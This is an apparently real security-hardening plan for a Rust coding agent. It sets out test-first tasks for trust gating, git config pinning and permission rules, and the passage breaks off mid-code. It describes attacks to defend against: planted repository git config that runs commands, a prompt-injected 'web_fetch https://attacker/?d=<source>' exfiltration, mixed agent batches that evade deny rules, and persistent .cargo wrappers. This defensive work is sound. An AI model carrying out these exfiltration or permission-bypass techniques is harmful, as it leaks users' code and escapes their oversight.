# Phase 2: Trust and Security Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Close every path where an untrusted repository, a model, or a log file can run code or read secrets the user did not approve.

**Architecture:** The trust check and all loaders move onto `project_config` (Task 1.4), so they agree on which files a project ships. Trust reads fail closed. Credentials leave URLs, traces and error strings. Child processes started for third-party code get a minimal environment.

**Tech Stack:** Rust 1.83, existing crates. Depends on Phase 1 (`davinci-sys`, `project_config`).

Read `00-index.md` for global constraints. Tasks marked **DECISION** change documented behavior; the default in the task is the recommendation, and the index lists them for Julien to confirm before merge.

---

## File map

| File | Tasks |
|---|---|
| `crates/davinci-coding-agent/src/trust.rs` | 2.1, 2.2 |
| `crates/davinci-coding-agent/src/hooks.rs:395-420` | 2.1 |
| `crates/davinci-coding-agent/src/mcp.rs:15-27` | 2.1 |
| `crates/davinci-coding-agent/src/settings.rs:941-1010` | 2.1 |
| `crates/davinci-coding-agent/src/main.rs:7543-7577, 8900-8908` | 2.1, 2.4 |
| `crates/davinci-coding-agent/src/packages.rs:780-806, 995-1050` | 2.3 |
| `crates/davinci-coding-agent/src/startup.rs:84-97` | 2.3 |
| `crates/davinci-coding-agent/src/sdk.rs:160-168, 294-330` | 2.5 |
| `crates/davinci-coding-agent/src/lib.rs` | 2.5 (`pub mod permissions;`) |
| `crates/davinci-agent/src/permission.rs:605-626, 1189-1191, 1390-1401` | 2.6, 2.8 |
| `crates/davinci-agent/src/permission_risk.rs:90-99` | 2.7 |
| `crates/davinci-agent/src/web.rs:59-110` | 2.9 |
| `crates/davinci-ai/src/stream.rs:719, 829-836, 1507-1510` | 2.10 |
| `crates/davinci-ai/src/stream_decoder.rs:145-156` | 2.11 |
| `crates/davinci-ai/src/oauth_providers.rs:135-155, 404-455` | 2.11, 2.14 |
| `crates/davinci-mcp/src/stdio.rs:44-60`, `config.rs` | 2.12 |
| `crates/davinci-coding-agent/src/native_extensions/graph/mod.rs:740-760, 840-862` | 2.13 |
| `crates/davinci-ai/src/oauth_callback.rs:319-400` | 2.14 |
| `crates/davinci-coding-agent/src/main.rs:6685-6740` | 2.14 |
| `crates/davinci-ai/Cargo.toml`, `auth.rs:205-260`, `oauth_providers.rs:382-425`, `crates/davinci-mcp/src/http.rs:250-260` | 2.15 |

---

### Task 2.1: The trust check covers every project resource in both config dirs

**Findings fixed:** review 1.1 (a repo with only `.pi/mcp.json` is auto-trusted and its MCP server command runs) and 1.2 (an empty `.davinci/` hides `.pi/hooks.json` from the check while the hook loader still runs it).

**Files:**
- Modify: `crates/davinci-coding-agent/src/trust.rs:11-20, 203-236`
- Modify: `crates/davinci-coding-agent/src/hooks.rs:403-412`
- Modify: `crates/davinci-coding-agent/src/mcp.rs:20-25`
- Modify: `crates/davinci-coding-agent/src/settings.rs:947-952, 1002-1007`
- Modify: `crates/davinci-coding-agent/src/main.rs:7553-7555, 7567-7569`

**Interfaces:**
- Consumes: `crate::project_config::{resolve, all, any_exists}` (Task 1.4)
- Produces: `TRUST_REQUIRING_PROJECT_CONFIG_RESOURCES` now also lists `mcp.json`, `agents`, `git`, `npm`.

- [ ] **Step 1: Write the failing tests**

Add to the `tests` module in `trust.rs`:

```rust
    #[test]
    fn project_mcp_config_requires_trust() {
        let dir = tempdir().unwrap();
        let cwd = dir.path().join("repo");
        fs::create_dir_all(cwd.join(".pi")).unwrap();
        fs::write(
            cwd.join(".pi").join("mcp.json"),
            r#"{"mcpServers":{"x":{"command":"calc"}}}"#,
        )
        .unwrap();
        assert!(has_trust_requiring_project_resources(&cwd));
    }

    #[test]
    fn empty_davinci_dir_does_not_hide_legacy_hooks() {
        let dir = tempdir().unwrap();
        let cwd = dir.path().join("repo");
        fs::create_dir_all(cwd.join(".davinci")).unwrap();
        fs::write(cwd.join(".davinci").join("README"), "").unwrap();
        fs::create_dir_all(cwd.join(".pi")).unwrap();
        fs::write(cwd.join(".pi").join("hooks.json"), "{}").unwrap();
        assert!(has_trust_requiring_project_resources(&cwd));
    }

    #[test]
    fn project_agents_and_local_package_roots_require_trust() {
        for name in ["agents", "git", "npm"] {
            let dir = tempdir().unwrap();
            let cwd = dir.path().join("repo");
            fs::create_dir_all(cwd.join(".pi").join(name)).unwrap();
            assert!(has_trust_requiring_project_resources(&cwd), "{name}");
        }
    }

    #[test]
    fn untrusted_repo_with_only_mcp_json_is_not_auto_trusted() {
        let dir = tempdir().unwrap();
        let agent = dir.path().join("agent");
        let cwd = dir.path().join("repo");
        fs::create_dir_all(cwd.join(".pi")).unwrap();
        fs::write(cwd.join(".pi").join("mcp.json"), "{}").unwrap();
        assert!(!resolve_project_trusted(&agent, &cwd, None, Some("ask"), &[]));
    }
```

- [ ] **Step 2: Run to verify failure**

Run: `cargo test -p davinci-coding-agent --lib trust::tests`
Expected: the four new tests FAIL (`assertion failed: has_trust_requiring_project_resources(&cwd)`); the existing four still PASS.

- [ ] **Step 3: Implement the check**

In `trust.rs`, replace the constant at lines 11-20:

```rust
/// Everything under `.davinci/` or `.pi/` that can run code, change the
/// prompt, or change what the agent may do. Keep in sync with every loader
/// that reads project config: a loader reading a name missing here runs
/// untrusted content.
const TRUST_REQUIRING_PROJECT_CONFIG_RESOURCES: &[&str] = &[
    "settings.json",
    "extensions",
    "skills",
    "prompts",
    "themes",
    "SYSTEM.md",
    "APPEND_SYSTEM.md",
    "hooks.json",
    "mcp.json",
    "agents",
    "git",
    "npm",
];
```

Replace lines 209-221 of `has_trust_requiring_project_resources` (from `let mut current = ...` through the first `return true; }`) with:

```rust
    let mut current = PathBuf::from(canonicalize_trust_path(cwd));
    // Both config dirs, every name: loaders fall back from `.davinci` to
    // `.pi` per file, so checking only one dir lets the other run unchecked.
    if crate::project_config::any_exists(&current, TRUST_REQUIRING_PROJECT_CONFIG_RESOURCES) {
        return true;
    }
```

- [ ] **Step 4: Switch the single-file loaders to the resolver**

`hooks.rs` lines 404-412 become:

```rust
        let project_path = crate::project_config::resolve(cwd, "hooks.json");
```

`mcp.rs` lines 20-25 become:

```rust
    let Some(path) = crate::project_config::resolve(cwd, "mcp.json") else {
        return user;
    };
```

(and the following `let project = davinci_mcp::load_path(&path).unwrap_or_default();` stays).

`settings.rs` lines 947-952 (`load_security_scan_config`) become:

```rust
    let [current, legacy] = crate::project_config::candidates(cwd, "settings.json");
    let project = if current.exists() { current } else { legacy };
```

`settings.rs` lines 1002-1007 (`load_merged_settings_with_override`) become the same two lines with `let project_path = if current.exists() { current } else { legacy };`.

In `main.rs` `apply_discovered_resources`, replace

```rust
        if trusted {
            roots.push(agent.cwd.join(".pi").join("skills"));
        }
```

with

```rust
        if trusted {
            roots.extend(project_config::all(&agent.cwd, "skills"));
        }
```

and the matching `prompts` block with `roots.extend(project_config::all(&agent.cwd, "prompts"));`.

- [ ] **Step 5: Run the tests**

Run: `cargo test -p davinci-coding-agent --lib trust:: hooks:: settings::` then `cargo test -p davinci-coding-agent --bin davinci mcp::`
Expected: PASS, including the four new trust tests and the existing hooks/mcp tests.

- [ ] **Step 6: Commit**

```bash
git add crates/davinci-coding-agent/src/trust.rs crates/davinci-coding-agent/src/hooks.rs crates/davinci-coding-agent/src/mcp.rs crates/davinci-coding-agent/src/settings.rs crates/davinci-coding-agent/src/main.rs
git commit -m "fix(trust): require trust for mcp.json, agents and package roots in both config dirs"
```

---

### Task 2.2: Trust reads fail closed

**Finding fixed:** review 1.3 / coding-agent 7. `ProjectTrustStore::get_entry` (`trust.rs:58-65`) turns a lock or parse error into `None`, so a stored "Do not trust" is skipped and `defaultProjectTrust: "always"` decides.

**Files:**
- Modify: `crates/davinci-coding-agent/src/trust.rs:54-65, 108-114`

**Interfaces:**
- Produces: `ProjectTrustStore::try_get(&self, cwd: &Path) -> Result<Option<bool>, String>`

- [ ] **Step 1: Write the failing tests**

```rust
    #[test]
    fn unreadable_trust_store_is_not_trusted_even_with_default_always() {
        let dir = tempdir().unwrap();
        let agent = dir.path().join("agent");
        let project = dir.path().join("project");
        fs::create_dir_all(project.join(".pi")).unwrap();
        fs::write(project.join(".pi").join("settings.json"), "{}").unwrap();
        fs::create_dir_all(&agent).unwrap();
        fs::write(agent.join("trust.json"), "{ not json").unwrap();
        assert!(!resolve_project_trusted(&agent, &project, None, Some("always"), &[]));
    }

    #[test]
    fn held_trust_lock_is_not_trusted_even_with_default_always() {
        let dir = tempdir().unwrap();
        let agent = dir.path().join("agent");
        let project = dir.path().join("project");
        fs::create_dir_all(project.join(".pi")).unwrap();
        fs::write(project.join(".pi").join("settings.json"), "{}").unwrap();
        fs::create_dir_all(&agent).unwrap();
        fs::write(agent.join("trust.json.lock"), "1\n").unwrap();
        assert!(!resolve_project_trusted(&agent, &project, None, Some("always"), &[]));
    }
```

- [ ] **Step 2: Run to verify failure**

Run: `cargo test -p davinci-coding-agent --lib trust::tests::unreadable trust::tests::held`
Expected: both FAIL (`resolve_project_trusted` returns `true`).

- [ ] **Step 3: Implement**

Add below `get_entry`:

```rust
    /// `Err` means a decision may exist but cannot be read. Callers that
    /// grant anything must treat that as "not trusted".
    pub fn try_get(&self, cwd: &Path) -> Result<Option<bool>, String> {
        with_settings_lock(&self.trust_path, || {
            let data = read_trust_file(&self.trust_path)?;
            Ok(find_nearest_trust_entry(&data, cwd).map(|entry| entry.decision))
        })
    }
```

In `resolve_project_trusted`, replace

```rust
    let store = ProjectTrustStore::open(agent_dir);
    if let Some(decision) = store.get(cwd) {
        return decision;
    }
```

with

```rust
    match ProjectTrustStore::open(agent_dir).try_get(cwd) {
        Ok(Some(decision)) => return decision,
        Ok(None) => {}
        // A stored "Do not trust" we cannot read must not be overridden by
        // `defaultProjectTrust` or `trustedProjects`.
        Err(_) => return false,
    }
```

- [ ] **Step 4: Run to verify pass**

Run: `cargo test -p davinci-coding-agent --lib trust::`
Expected: PASS (all trust tests). The held-lock test waits for the lock timeout (about 200 ms with today's lock, up to the `wait` passed in Task 3.4 later); that is expected.

- [ ] **Step 5: Commit**

```bash
git add crates/davinci-coding-agent/src/trust.rs
git commit -m "fix(trust): fail closed when the trust store cannot be read"
```

---

### Task 2.3: The startup update check never runs git or npm for an untrusted project

**Finding fixed:** review 1.4 / coding-agent 3. `check_for_available_updates` (`packages.rs:780-806`) reads `cwd/.pi/settings.json` packages with no trust check, then runs `git rev-parse` / `git ls-remote origin HEAD` with `current_dir` inside `cwd/.pi/git/...`. A planted bare repo with `core.sshCommand` or `remote.origin.uploadpack` in its config runs a command before any trust prompt.

**Files:**
- Modify: `crates/davinci-coding-agent/src/packages.rs:780-790, 1003-1047`
- Modify: `crates/davinci-coding-agent/src/startup.rs:84-97, 209-220`
- Modify: `crates/davinci-coding-agent/Cargo.toml` (add `davinci-sys = { path = "../davinci-sys" }`)

**Interfaces:**
- Produces: `check_for_available_updates(settings: &Settings, agent_dir: &Path, cwd: &Path, project_trusted: bool) -> Vec<String>`

- [ ] **Step 1: Write the failing test**

Add to the `tests` module in `startup.rs` (next to the existing update test at line ~190, same env-restore style):

```rust
    #[test]
    fn untrusted_project_packages_are_not_checked_for_updates() {
        let dir = tempfile::tempdir().unwrap();
        let project_settings = dir.path().join(".pi");
        std::fs::create_dir_all(&project_settings).unwrap();
        std::fs::write(
            project_settings.join("settings.json"),
            r#"{"packages":["npm:evil"]}"#,
        )
        .unwrap();
        let installed = dir.path().join(".pi").join("npm").join("node_modules").join("evil");
        std::fs::create_dir_all(&installed).unwrap();
        std::fs::write(installed.join("package.json"), r#"{"name":"evil","version":"1.0.0"}"#)
            .unwrap();
        let old = std::env::var_os("PI_NPM_VIEW_REPLY");
        std::env::set_var("PI_NPM_VIEW_REPLY", "\"2.0.0\"");
        let settings = Settings::default();
        let agent = dir.path().join("agent");
        let untrusted =
            crate::packages::check_for_available_updates(&settings, &agent, dir.path(), false);
        let trusted =
            crate::packages::check_for_available_updates(&settings, &agent, dir.path(), true);
        match old {
            Some(value) => std::env::set_var("PI_NPM_VIEW_REPLY", value),
            None => std::env::remove_var("PI_NPM_VIEW_REPLY"),
        }
        assert!(untrusted.is_empty());
        assert_eq!(trusted, vec!["evil".to_string()]);
    }
```

Update the two existing calls at `startup.rs:209` and `:216` to pass `true` as the new last argument (they test user-level packages, which are always checked).

- [ ] **Step 2: Run to verify failure**

Run: `cargo test -p davinci-coding-agent --bin davinci startup::tests::untrusted_project_packages`
Expected: FAIL to compile, `this function takes 3 arguments but 4 arguments were supplied`.

- [ ] **Step 3: Implement the trust gate**

`packages.rs`, change the signature and the project read:

```rust
pub fn check_for_available_updates(
    settings: &Settings,
    agent_dir: &Path,
    cwd: &Path,
    project_trusted: bool,
) -> Vec<String> {
    let mut sources = Vec::new();
    // An untrusted checkout's package list and its `.pi/git` / `.pi/npm`
    // trees are attacker-controlled; running git or npm in them executes
    // repository config before the user was asked.
    if project_trusted {
        let project = load_settings(&cwd.join(".pi"));
        for pkg in &project.packages {
            sources.push((pkg.source().to_string(), true));
        }
    }
```

`startup.rs` `check_for_package_updates`, replace the last line with:

```rust
    let trusted = crate::settings::is_trusted(settings, &cwd, None);
    crate::packages::check_for_available_updates(settings, &agent_dir, &cwd, trusted)
```

- [ ] **Step 4: Harden the git calls that remain (user-level packages)**

Add to `packages.rs` next to `git_rev_parse`:

```rust
/// git for update checks. Command-line `-c` beats repository config, so a
/// cloned package cannot pick the ssh program, the upload-pack program, a
/// fsmonitor hook or the `ext::` transport.
fn update_check_git(dir: &Path, args: &[&str]) -> Option<String> {
    let git = std::env::var("PI_GIT_CMD").unwrap_or_else(|_| "git".into());
    let mut command = std::process::Command::new(davinci_sys::process::resolve_program(&git));
    command
        .current_dir(dir)
        .env("GIT_TERMINAL_PROMPT", "0")
        .env("GIT_CONFIG_NOSYSTEM", "1")
        .args([
            "-c", "core.fsmonitor=false",
            "-c", "core.hooksPath=",
            "-c", "core.sshCommand=ssh",
            "-c", "protocol.ext.allow=never",
            "-c", "remote.origin.uploadpack=git-upload-pack",
            "-c", "safe.bareRepository=explicit",
        ])
        .args(args);
    let output = davinci_sys::process::run_bounded(
        command,
        None,
        davinci_sys::process::RunLimits {
            timeout: std::time::Duration::from_secs(15),
            output_cap: 64 * 1024,
        },
        &|| false,
    )
    .ok()?;
    if !output.status.is_some_and(|status| status.success()) {
        return None;
    }
    Some(String::from_utf8_lossy(&output.stdout).trim().to_string())
}
```

In `git_rev_parse`, replace the `Command::new("git")...` block (from `let output = std::process::Command::new("git")` through the final `Some(...)`) with `update_check_git(installed, &["rev-parse", rev])`.

In `remote_git_head`, replace the `let git = ...` through `parse_ls_remote_head(&String::from_utf8_lossy(&output.stdout))` with:

```rust
    let raw = update_check_git(installed, &["ls-remote", "origin", "HEAD"])?;
    parse_ls_remote_head(&raw)
```

- [ ] **Step 5: Run to verify pass**

Run: `cargo test -p davinci-coding-agent --bin davinci startup:: packages::`
Expected: PASS.

- [ ] **Step 6: Commit**

```bash
git add crates/davinci-coding-agent/Cargo.toml crates/davinci-coding-agent/src/packages.rs crates/davinci-coding-agent/src/startup.rs Cargo.lock
git commit -m "fix(packages): skip untrusted project packages in update checks and pin git config"
```

---

### Task 2.4: Extension `reload` keeps trust gating and every resource root

**Finding fixed:** coding-agent 4. `main.rs:8900-8903` replaces skills and prompts with `cwd/.pi/skills` and `cwd/.pi/prompts` only, with no trust check, and drops user, `--skill`, settings and package roots.

**Files:**
- Modify: `crates/davinci-coding-agent/src/main.rs:8900-8908`

- [ ] **Step 1: Write the failing test**

Add to `main.rs` tests (same module as `apply_session_calls_creates_session_switches_model_and_steers`):

```rust
    #[test]
    fn extension_reload_does_not_load_untrusted_project_skills() {
        let _env = test_env_lock();
        let dir = tempfile::tempdir().unwrap();
        let _agent_dir = EnvRestore::set(
            "PI_CODING_AGENT_DIR",
            &dir.path().join("agent").to_string_lossy(),
        );
        let _davinci_agent_dir = EnvRestore::set(
            "DAVINCI_CODING_AGENT_DIR",
            &dir.path().join("agent").to_string_lossy(),
        );
        let skill_dir = dir.path().join(".pi").join("skills").join("planted");
        std::fs::create_dir_all(&skill_dir).unwrap();
        std::fs::write(
            skill_dir.join("SKILL.md"),
            "---\nname: planted\ndescription: planted skill\n---\n# Planted\n",
        )
        .unwrap();
        let mut agent = Agent::new("x");
        agent.cwd = dir.path().to_path_buf();
        apply_session_calls(
            None,
            &mut agent,
            SessionCallUi::Silent,
            &[serde_json::json!({"op":"reload"})],
            false,
        );
        assert!(agent.skills.iter().all(|skill| skill.name != "planted"));
    }
```

If the test module has no `test_env_lock()` helper, use the lock the neighbouring `EnvRestore` tests use (search the module for `static ENV_LOCK` / `env_lock`) so env-var tests stay serial.

- [ ] **Step 2: Run to verify failure**

Run: `cargo test -p davinci-coding-agent --bin davinci extension_reload_does_not_load_untrusted`
Expected: FAIL, the `planted` skill is present.

- [ ] **Step 3: Implement**

Replace the `Some("reload") => { ... }` arm body with:

```rust
            Some("reload") => {
                // Same trust-gated root assembly as startup, so a reload can
                // neither pull in untrusted project skills nor drop the
                // user's, --skill, settings and package roots.
                let fallback;
                let args = match parsed {
                    Some(args) => args,
                    None => {
                        fallback = Args::default();
                        &fallback
                    }
                };
                apply_discovered_resources(args, agent);
                ui.status(
                    "Reloaded keybindings, extensions, skills, prompts, themes, and context files",
                );
            }
```

- [ ] **Step 4: Run to verify pass**

Run: `cargo test -p davinci-coding-agent --bin davinci apply_session_calls extension_reload`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add crates/davinci-coding-agent/src/main.rs
git commit -m "fix(extensions): reload resources through the trust-gated loader"
```

---

### Task 2.5: The SDK honours project trust and the user's deny rules

**Finding fixed:** coding-agent 5. `sdk.rs:165-167` always loads `cwd/.pi/skills` and `.pi/prompts`; `sdk.rs:301-304` always lists `cwd/.pi/extensions`; no permission rules are loaded.

**Scope note (keeps a documented design):** the library default mode stays `AlwaysApprove` (see the comment on `impl Default for PermissionPolicy`, `permission.rs:824-828`, and `main.rs:714-717`). Only deny rules are added: `decide` checks deny rules before the `AlwaysApprove` shortcut (`permission.rs:1060` vs `:1158`), so they narrow without changing the mode.

**Files:**
- Modify: `crates/davinci-coding-agent/src/lib.rs` (add `pub mod permissions;` and `pub mod project_config;` if Task 1.4 did not already)
- Modify: `crates/davinci-coding-agent/src/sdk.rs:160-168, 294-330`

- [ ] **Step 1: Write the failing tests**

Add to `sdk.rs` tests:

```rust
    #[test]
    fn untrusted_project_skills_prompts_and_extensions_are_not_loaded() {
        let dir = tempfile::tempdir().unwrap();
        let agent_dir = dir.path().join("agent");
        std::fs::create_dir_all(&agent_dir).unwrap();
        let project = dir.path().join("project");
        let skill = project.join(".pi").join("skills").join("planted");
        std::fs::create_dir_all(&skill).unwrap();
        std::fs::write(
            skill.join("SKILL.md"),
            "---\nname: planted\ndescription: x\n---\n# x\n",
        )
        .unwrap();
        std::fs::create_dir_all(project.join(".pi").join("extensions").join("evil")).unwrap();
        let result = load_extensions_result(&agent_dir, &project, &[], false);
        assert!(result.extensions.is_empty());
        assert!(result.errors.is_empty());
        let skills = project_resource_roots(&project, false, "skills");
        assert!(skills.is_empty());
        assert_eq!(
            project_resource_roots(&project, true, "skills"),
            vec![project.join(".pi").join("skills")]
        );
    }

    #[test]
    fn user_deny_rules_apply_to_sdk_sessions() {
        let dir = tempfile::tempdir().unwrap();
        let agent_dir = dir.path().join("agent");
        std::fs::create_dir_all(&agent_dir).unwrap();
        std::fs::write(
            agent_dir.join("settings.json"),
            r#"{"permissions":{"deny":["bash(rm *)"]}}"#,
        )
        .unwrap();
        let policy = sdk_permission_policy(&agent_dir, dir.path());
        assert_eq!(policy.mode, davinci_agent::PermissionMode::AlwaysApprove);
        assert!(matches!(
            policy.decide("c1", "bash", &serde_json::json!({"command":"rm -rf x"}), dir.path()),
            davinci_agent::PermissionVerdict::Deny { .. }
        ));
    }
```

- [ ] **Step 2: Run to verify failure**

Run: `cargo test -p davinci-coding-agent --lib sdk::tests`
Expected: FAIL to compile (`project_resource_roots`, `sdk_permission_policy` not found; `load_extensions_result` takes 3 arguments).

- [ ] **Step 3: Implement**

Add to `sdk.rs`:

```rust
/// Project directories for `kind` (skills, prompts), only when the project
/// is trusted. An embedder opening an untrusted checkout must not put that
/// checkout's text into the system prompt.
fn project_resource_roots(cwd: &Path, trusted: bool, kind: &str) -> Vec<PathBuf> {
    if trusted {
        crate::project_config::all(cwd, kind)
    } else {
        Vec::new()
    }
}

/// The library keeps its documented default mode (every tool runs), but the
/// user's deny rules, and a trusted project's, still apply: deny rules are
/// checked before the mode shortcut.
fn sdk_permission_policy(agent_dir: &Path, cwd: &Path) -> davinci_agent::PermissionPolicy {
    let product = crate::permissions::policy_for(agent_dir, cwd, None, None);
    let mut policy = davinci_agent::PermissionPolicy::default();
    policy.deny = product.deny;
    policy.project_trusted = product.project_trusted;
    policy
}
```

In `create_agent_session`, after `let settings = load_merged_settings(&agent_dir, &cwd);` add:

```rust
    let trusted = crate::settings::is_trusted(&settings, &cwd, None);
```

Replace lines 165-167 with:

```rust
    let mut skill_roots = project_resource_roots(&cwd, trusted, "skills");
    skill_roots.push(agent_dir.join("skills"));
    agent.skills = discover_skills(&skill_roots);
    let mut prompt_roots = project_resource_roots(&cwd, trusted, "prompts");
    prompt_roots.push(agent_dir.join("prompts"));
    agent.templates = discover_prompt_templates(&prompt_roots);
    agent.permissions = std::sync::Arc::new(davinci_agent::PermissionState::new(
        sdk_permission_policy(&agent_dir, &cwd),
    ));
```

Change `load_extensions_result` to take `trusted: bool`, and build both lists from:

```rust
    let mut roots = vec![agent_dir.join("extensions")];
    roots.extend(project_resource_roots(cwd, trusted, "extensions"));
```

using `roots` in the discovery loop and `roots.iter().map(|root| root.join(&name))` for `candidates`. Update its caller in `create_agent_session` to pass `trusted`.

`is_trusted` uses `davinci_session::default_agent_dir()`, not `options.agent_dir`. For an embedder that passes a custom `agent_dir`, call `crate::trust::resolve_project_trusted(&agent_dir, &cwd, None, settings.default_project_trust.as_deref(), &settings.trusted_projects)` instead of `is_trusted`. Use that form.

- [ ] **Step 4: Run to verify pass**

Run: `cargo test -p davinci-coding-agent --lib sdk::`
Expected: PASS, including existing SDK tests at `sdk.rs:540` and `:650` (those set up `.pi/prompts` and `.pi/extensions`; if they now fail because the fixture project is untrusted, add `std::fs::write(agent_dir.join("trust.json"), format!("{{{:?}: true}}\n", crate::trust::canonicalize_trust_path(&project)))` to their setup so they test a trusted project explicitly).

- [ ] **Step 5: Commit**

```bash
git add crates/davinci-coding-agent/src/lib.rs crates/davinci-coding-agent/src/sdk.rs
git commit -m "fix(sdk): gate project resources on trust and apply user deny rules"
```

---

### Task 2.6 (DECISION): Plan mode asks before fetching arbitrary URLs

**Finding fixed:** davinci-agent 14. `permission.rs:1189-1191` allows every `Network` tool in `ReadOnly` (Plan) mode without a prompt. `web_fetch https://attacker/?d=<source>` from a prompt-injected file then leaks source in the "safest" mode.

**Recommended behavior:** `web_search` stays allowed in Plan mode (the query goes to the configured search provider, not an attacker URL). `web_fetch` and `visual_snapshot` ask, exactly as in Ask mode. An explicit allow rule such as `web_fetch(docs.rs)` still allows, because allow rules are checked earlier (`permission.rs:1166-1180`).

**Files:**
- Modify: `crates/davinci-agent/src/permission.rs:113-115, 1189-1191, 2709-2713`

- [ ] **Step 1: Change the existing test to the new expectation, add one**

At `permission.rs:2709-2713` replace the `read_only` assertion with:

```rust
        let read_only = PermissionPolicy::new(PermissionMode::ReadOnly);
        assert!(matches!(
            read_only.decide("c1", "web_fetch", &fetch, &cwd()),
            PermissionVerdict::Ask(_)
        ));
        assert!(matches!(
            read_only.decide("c1", "web_search", &json!({"query": "rust diff"}), &cwd()),
            PermissionVerdict::Allow
        ));
        let mut read_only_granted = PermissionPolicy::new(PermissionMode::ReadOnly);
        read_only_granted.allow = vec![PermissionRule::parse("web_fetch(docs.rs)").unwrap()];
        assert!(matches!(
            read_only_granted.decide("c1", "web_fetch", &fetch, &cwd()),
            PermissionVerdict::Allow
        ));
```

- [ ] **Step 2: Run to verify failure**

Run: `cargo test -p davinci-agent --lib permission::tests`
Expected: FAIL on the `read_only` `web_fetch` assertion (got `Allow`).

- [ ] **Step 3: Implement**

Replace lines 1189-1191:

```rust
        // Plan mode researches without prompting, but only through the
        // search provider. Fetching a URL can carry workspace data to any
        // host in its query string, so it asks unless a rule allowed it.
        if class == ToolClass::Network
            && self.mode == PermissionMode::ReadOnly
            && tool == "web_search"
        {
            return PermissionVerdict::Allow;
        }
```

Update the doc comment at lines 113-114:

```rust
    /// Reaches outside the machine (`web_fetch`, `web_search`,
    /// `visual_snapshot`). Plan Mode allows `web_search` without a prompt;
    /// fetching a URL asks in every prompted mode unless a rule allows it.
```

- [ ] **Step 4: Run to verify pass**

Run: `cargo test -p davinci-agent --lib permission::`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add crates/davinci-agent/src/permission.rs
git commit -m "fix(permission): ask before web_fetch in plan mode"
```

---

### Task 2.7 (DECISION): Auto mode protects toolchain config that outlives the session

**Finding fixed (scoped):** davinci-agent 15. Auto mode auto-allows in-project edits that are not protected (`permission.rs:1192-1200`) and auto-allows `cargo test|check|build|clippy --offline` (`permission_risk.rs:388-402`).

**What this task does and does not do:** running `cargo test` in Auto mode already runs model-written code (the tests themselves). That is the contract of Auto mode and this plan does not change it. The real escalation is config that changes *which programs* run and **persists after the session**, into the user's own later builds: `.cargo/config*` (`build.rustc-wrapper`, `target.<triple>.runner`, `[alias]`) and `rust-toolchain*`. Those become protected, so Auto mode asks before editing them. The Auto-mode description gets one sentence saying tests run model-written code.

**Files:**
- Modify: `crates/davinci-agent/src/permission_risk.rs:90-99`
- Modify: the Auto-mode `describe()` string in `crates/davinci-agent/src/permission.rs` (search `PermissionMode::Auto =>` inside `fn describe`)

- [ ] **Step 1: Write the failing test**

Add to `permission_risk.rs` tests:

```rust
    #[test]
    fn toolchain_config_is_protected() {
        for path in [
            ".cargo/config.toml",
            ".cargo/config",
            "sub/.cargo/config.toml",
            "rust-toolchain",
            "rust-toolchain.toml",
        ] {
            assert!(is_protected_path(path), "{path}");
        }
        assert!(!is_protected_path("src/lib.rs"));
        assert!(!is_protected_path("Cargo.toml"));
    }
```

- [ ] **Step 2: Run to verify failure**

Run: `cargo test -p davinci-agent --lib permission_risk::tests::toolchain_config_is_protected`
Expected: FAIL on `.cargo/config.toml`.

- [ ] **Step 3: Implement**

```rust
pub(super) fn is_protected_path(path: &str) -> bool {
    let parts = normalized_parts(path);
    is_secret_path(path)
        || parts.iter().any(|part| {
            matches!(part.as_str(), ".pi" | ".davinci" | ".git" | ".cargo")
                || matches!(
                    part.as_str(),
                    ".pi_patch_journal.json" | ".davinci_patch_journal.json"
                )
        })
        // Toolchain pins persist past the session into the user's own builds.
        || parts
            .last()
            .is_some_and(|name| matches!(name.as_str(), "rust-toolchain" | "rust-toolchain.toml"))
}
```

Append to the Auto-mode description string: ` Tests it runs execute code it wrote.`

- [ ] **Step 4: Run to verify pass**

Run: `cargo test -p davinci-agent --lib permission`
Expected: PASS. If a snapshot test pins the Auto description text, update that expected string.

- [ ] **Step 5: Commit**

```bash
git add crates/davinci-agent/src/permission_risk.rs crates/davinci-agent/src/permission.rs
git commit -m "fix(permission): protect .cargo and rust-toolchain from auto-approved edits"
```

---

### Task 2.8: `agent` permission rules judge every task in a batch

**Finding fixed:** davinci-agent 4. `get_param_value` (`permission.rs:617-625`) and the `agent` subject (`permission.rs:1390-1401`) only read `tasks[0]`. `{"tasks":[{"isolation":"shared"},{"isolation":"worktree"}]}` passes a `deny: agent(isolation:worktree)` rule, and a session allow for `agent(isolation:shared)` approves mixed batches. `subagent.rs:342` ignores top-level `isolation` when `tasks` is present, so `{"isolation":"shared","tasks":[{"isolation":"worktree"}]}` is judged as shared and runs as worktree.

**Files:**
- Modify: `crates/davinci-agent/src/permission.rs:923-929` (top of `decide`)

**Interfaces:**
- Produces: `fn split_agent_tasks(args: &Value) -> Option<Vec<Value>>` (private)

- [ ] **Step 1: Write the failing tests**

```rust
    #[test]
    fn agent_deny_rule_matches_any_task_in_a_batch() {
        let mut policy = PermissionPolicy::new(PermissionMode::AlwaysApprove);
        policy.deny = vec![PermissionRule::parse("agent(isolation:worktree)").unwrap()];
        let batch = json!({"tasks":[
            {"prompt":"a","isolation":"shared"},
            {"prompt":"b","isolation":"worktree"}
        ]});
        assert!(is_deny(&verdict(&policy, "agent", batch)));
    }

    #[test]
    fn agent_allow_rule_must_match_every_task() {
        let mut policy = PermissionPolicy::new(PermissionMode::Ask);
        policy.allow = vec![PermissionRule::parse("agent(isolation:shared)").unwrap()];
        let mixed = json!({"tasks":[
            {"prompt":"a","isolation":"shared"},
            {"prompt":"b","isolation":"worktree"}
        ]});
        assert!(is_ask(&verdict(&policy, "agent", mixed)));
        let uniform = json!({"tasks":[
            {"prompt":"a","isolation":"shared"},
            {"prompt":"b"}
        ]});
        assert!(matches!(verdict(&policy, "agent", uniform), PermissionVerdict::Allow));
    }

    #[test]
    fn agent_top_level_fields_beside_tasks_are_refused() {
        let policy = PermissionPolicy::new(PermissionMode::AlwaysApprove);
        let ambiguous = json!({"isolation":"shared","tasks":[{"prompt":"a","isolation":"worktree"}]});
        assert!(is_deny(&verdict(&policy, "agent", ambiguous)));
    }
```

- [ ] **Step 2: Run to verify failure**

Run: `cargo test -p davinci-agent --lib permission::tests::agent_`
Expected: the three new tests FAIL.

- [ ] **Step 3: Implement**

At the very top of `decide` (before the `propose_plan` block), add:

```rust
        if tool == "agent" {
            if let Some(tasks) = split_agent_tasks(args) {
                return self.decide_agent_batch(tool_call_id, &tasks, cwd);
            }
            if args.get("tasks").is_some() {
